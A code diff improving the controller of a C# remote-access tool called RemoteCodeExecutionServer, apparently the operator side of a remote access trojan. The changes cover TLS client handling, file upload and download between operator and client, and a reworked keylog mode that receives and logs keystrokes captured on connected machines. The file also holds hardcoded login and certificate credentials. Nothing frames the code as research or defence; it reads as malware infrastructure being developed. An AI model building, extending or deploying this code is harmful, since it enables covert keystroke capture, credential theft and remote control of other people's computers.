@@ -6,6 +6,7 @@ using System.Net.Security;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace RemoteCodeExecutionServer
@@ -23,11 +24,20 @@ namespace RemoteCodeExecutionServer
     {
         private const string Username = "BHI78h8uU8G6#%*";
         private const string Password = "KNKBUBI88h97===";
-        private const string CertFile = "server.pfx"; // Ensure this file exists in the server directory
-        private const string CertPassword = "yourpassword"; // Replace with your certificate password
+        private const string CertFile = "server.pfx";
+        private const string CertPassword = "83831383dsh";
+
+        // Limit to 20 concurrent clients (adjust as needed)
+        private static readonly SemaphoreSlim ClientSemaphore = new SemaphoreSlim(20);
 
         public static async Task Main(string[] args)
         {
+            if (!File.Exists(CertFile))
+            {
+                Console.WriteLine($"Certificate file '{CertFile}' not found.");
+                return;
+            }
+
             while (true)
             {
                 int port;
@@ -67,42 +77,52 @@ namespace RemoteCodeExecutionServer
             while (true)
             {
                 var client = await listener.AcceptTcpClientAsync();
-                _ = HandleClientAsync(client, port); // Handle each client in a separate task
+                await ClientSemaphore.WaitAsync();
+                _ = Task.Run(async () =>
+                {
+                    try
+                    {
+                        await HandleClientAsync(client, port);
+                    }
+                    finally
+                    {
+                        ClientSemaphore.Release();
+                    }
+                });
             }
         }
 
         private static async Task HandleClientAsync(TcpClient client, int port)
         {
-            var logger = new Logger($"server_{port}.log");
-            try
+            using (client)
             {
-                using (var stream = client.GetStream())
-                using (var sslStream = new SslStream(stream, false))
+                var logger = new Logger($"server_{port}.log");
+                try
                 {
-                    var cert = new X509Certificate2(CertFile, CertPassword);
-                    await sslStream.AuthenticateAsServerAsync(cert, false, SslProtocols.Tls12, false);
-                    var connection = new ConnectionManager(client, sslStream);
+                    using (var stream = client.GetStream())
+                    using (var sslStream = new SslStream(stream, false))
+                    {
+                        var cert = new X509Certificate2(CertFile, CertPassword);
+                        await sslStream.AuthenticateAsServerAsync(cert, false, SslProtocols.Tls12, false);
+                        var connection = new ConnectionManager(client, sslStream);
 
-                    Console.WriteLine("Client connected");
-                    if (await AuthenticateClientAsync(connection))
-                    {
-                        Console.WriteLine("Client authenticated successfully.");
-                        await HandleCommandsAsync(connection, logger);
-                    }
-                    else
-                    {
-                        Console.WriteLine("Client failed authentication.");
+                        Console.WriteLine("Client connected");
+                        if (await AuthenticateClientAsync(connection))
+                        {
+                            Console.WriteLine("Client authenticated successfully.");
+                            await HandleCommandsAsync(connection, logger);
+                        }
+                        else
+                        {
+                            Console.WriteLine("Client failed authentication.");
+                        }
                     }
                 }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error handling client: {ex.Message}");
-                logger.Log("Client Error", ex.Message);
-            }
-            finally
-            {
-                client.Close();
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error handling client: {ex.Message}");
+                    logger.Log("Client Error", ex.Message);
+                }
             }
         }
 
@@ -136,27 +156,7 @@ namespace RemoteCodeExecutionServer
                     {
                         inKeylogMode = true;
                         await connection.SendCommandAsync("start_keylog");
-                        _ = Task.Run(async () =>
-                        {
-                            while (inKeylogMode)
-                            {
-                                try
-                                {
-                                    var (type, data) = await connection.ReceiveTypedDataAsync();
-                                    if (type == MessageType.Keylog)
-                                    {
-                                        var key = Encoding.UTF8.GetString(data);
-                                        Console.WriteLine($"Key pressed: {key}");
-                                        logger.Log("Keylog", key);
-                                    }
-                                }
-                                catch (Exception ex)
-                                {
-                                    Console.WriteLine($"Error receiving keylog: {ex.Message}");
-                                    inKeylogMode = false;
-                                }
-                            }
-                        });
+                        Console.WriteLine("Keylog mode started. Enter /rce to go back to command mode.");
                     }
                     else if (command == "/exit")
                     {
@@ -175,23 +175,33 @@ namespace RemoteCodeExecutionServer
                         if (command.StartsWith("upload "))
                         {
                             var filePath = command.Substring(7);
-                            using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
+                            try
                             {
-                                while (true)
+                                using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                                 {
-                                    var (type, data) = await connection.ReceiveTypedDataAsync();
-                                    if (type == MessageType.FileChunk)
-                                        await fileStream.WriteAsync(data, 0, data.Length);
-                                    else if (type == MessageType.FileEnd)
-                                        break;
+                                    while (true)
+                                    {
+                                        var (type, data) = await connection.ReceiveTypedDataAsync();
+                                        if (type == MessageType.FileChunk)
+                                            await fileStream.WriteAsync(data, 0, data.Length);
+                                        else if (type == MessageType.FileEnd)
+                                            break;
+                                    }
+                                }
+                                var (respType, respData) = await connection.ReceiveTypedDataAsync();
+                                if (respType == MessageType.Response)
+                                {
+                                    var result = Encoding.UTF8.GetString(respData);
+                                    Console.WriteLine("Result:\n" + result);
+                                    logger.Log(command, result);
                                 }
                             }
-                            var (respType, respData) = await connection.ReceiveTypedDataAsync();
-                            if (respType == MessageType.Response)
+                            catch (Exception ex)
                             {
-                                var result = Encoding.UTF8.GetString(respData);
-                                Console.WriteLine("Result:\n" + result);
-                                logger.Log(command, result);
+                                if (File.Exists(filePath))
+                                    File.Delete(filePath);
+                                Console.WriteLine($"Error receiving file: {ex.Message}");
+                                logger.Log(command, $"Error: {ex.Message}");
                             }
                         }
                         else if (command.StartsWith("download "))
@@ -205,11 +215,10 @@ namespace RemoteCodeExecutionServer
                                     int bytesRead;
                                     while ((bytesRead = await fileStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                                     {
-                                        var chunk = new byte[bytesRead];
-                                        Array.Copy(buffer, chunk, bytesRead);
-                                        await connection.SendTypedDataAsync(MessageType.FileChunk, chunk);
+                                        // Reuse buffer to avoid extra allocations
+                                        await connection.SendTypedDataAsync(MessageType.FileChunk, buffer.AsSpan(0, bytesRead).ToArray());
                                     }
-                                    await connection.SendTypedDataAsync(MessageType.FileEnd, new byte[0]);
+                                    await connection.SendTypedDataAsync(MessageType.FileEnd, Array.Empty<byte>());
                                 }
                                 var (type, data) = await connection.ReceiveTypedDataAsync();
                                 if (type == MessageType.Response)
@@ -239,12 +248,42 @@ namespace RemoteCodeExecutionServer
                 }
                 else
                 {
-                    Console.WriteLine("Enter /rce to go back to command mode");
-                    var input = Console.ReadLine();
-                    if (input == "/rce")
+                    // Keylog mode: receive and print keylog data, exit on /rce
+                    while (inKeylogMode)
                     {
-                        inKeylogMode = false;
-                        await connection.SendCommandAsync("stop_keylog");
+                        Console.WriteLine("Enter /rce to go back to command mode");
+                        var keylogTask = connection.ReceiveTypedDataAsync();
+                        var inputTask = Task.Run(() => Console.ReadLine());
+
+                        var completedTask = await Task.WhenAny(keylogTask, inputTask);
+
+                        if (completedTask == keylogTask)
+                        {
+                            try
+                            {
+                                var (type, data) = await keylogTask;
+                                if (type == MessageType.Keylog)
+                                {
+                                    var key = Encoding.UTF8.GetString(data);
+                                    Console.WriteLine($"Key pressed: {key}");
+                                    logger.Log("Keylog", key);
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"Error receiving keylog: {ex.Message}");
+                                inKeylogMode = false;
+                            }
+                        }
+                        else if (completedTask == inputTask)
+                        {
+                            var input = await inputTask;
+                            if (input == "/rce")
+                            {
+                                inKeylogMode = false;
+                                await connection.SendCommandAsync("stop_keylog");
+                            }
+                        }
                     }
                 }
             }
@@ -274,7 +313,7 @@ namespace RemoteCodeExecutionServer
         }
     }
 
-    class ConnectionManager
+    class ConnectionManager : IDisposable
     {
         private readonly TcpClient _client;
         private readonly SslStream _sslStream;
@@ -310,14 +349,20 @@ namespace RemoteCodeExecutionServer
             try
             {
                 var lengthBuffer = new byte[4];
-                await _sslStream.ReadAsync(lengthBuffer, 0, lengthBuffer.Length);
+                int read = await _sslStream.ReadAsync(lengthBuffer, 0, lengthBuffer.Length);
+                if (read != 4)
+                    throw new IOException("Failed to read message length prefix.");
+
                 var messageLength = BitConverter.ToInt32(lengthBuffer, 0);
                 var messageBuffer = new byte[messageLength];
                 var bytesRead = 0;
 
                 while (bytesRead < messageLength)
                 {
-                    bytesRead += await _sslStream.ReadAsync(messageBuffer, bytesRead, messageLength - bytesRead);
+                    int chunk = await _sslStream.ReadAsync(messageBuffer, bytesRead, messageLength - bytesRead);
+                    if (chunk == 0)
+                        throw new IOException("Connection closed while reading message.");
+                    bytesRead += chunk;
                 }
 
                 return Encoding.UTF8.GetString(messageBuffer);
@@ -351,11 +396,17 @@ namespace RemoteCodeExecutionServer
             try
             {
                 var typeBuffer = new byte[1];
-                await _sslStream.ReadAsync(typeBuffer, 0, 1);
+                int readType = await _sslStream.ReadAsync(typeBuffer, 0, 1);
+                if (readType != 1)
+                    throw new IOException("Failed to read message type.");
+
                 var type = (MessageType)typeBuffer[0];
 
                 var lengthBuffer = new byte[4];
-                await _sslStream.ReadAsync(lengthBuffer, 0, 4);
+                int readLen = await _sslStream.ReadAsync(lengthBuffer, 0, 4);
+                if (readLen != 4)
+                    throw new IOException("Failed to read message length.");
+
                 var messageLength = BitConverter.ToInt32(lengthBuffer, 0);
 
                 byte[] data = new byte[messageLength];
@@ -363,7 +414,12 @@ namespace RemoteCodeExecutionServer
                 {
                     var bytesRead = 0;
                     while (bytesRead < messageLength)
-                        bytesRead += await _sslStream.ReadAsync(data, bytesRead, messageLength - bytesRead);
+                    {
+                        int chunk = await _sslStream.ReadAsync(data, bytesRead, messageLength - bytesRead);
+                        if (chunk == 0)
+                            throw new IOException("Connection closed while reading typed data.");
+                        bytesRead += chunk;
+                    }
                 }
                 return (type, data);
             }
@@ -377,6 +433,30 @@ namespace RemoteCodeExecutionServer
         {
             var data = Encoding.UTF8.GetBytes(command);
             await SendTypedDataAsync(MessageType.Command, data);
+        }
+
+        public async Task SendResponseAsync(string response)
+        {
+            var data = Encoding.UTF8.GetBytes(response);
+            await SendTypedDataAsync(MessageType.Response, data);
+        }
+
+        public async Task SendKeylogAsync(string key)
+        {
+            var data = Encoding.UTF8.GetBytes(key);
+            await SendTypedDataAsync(MessageType.Keylog, data);
+        }
+
+        public void Close()
+        {
+            _sslStream.Close();
+            _client.Close();
+        }
+
+        public void Dispose()
+        {
+            _sslStream.Dispose();
+            _client.Dispose();
         }
     }
 }
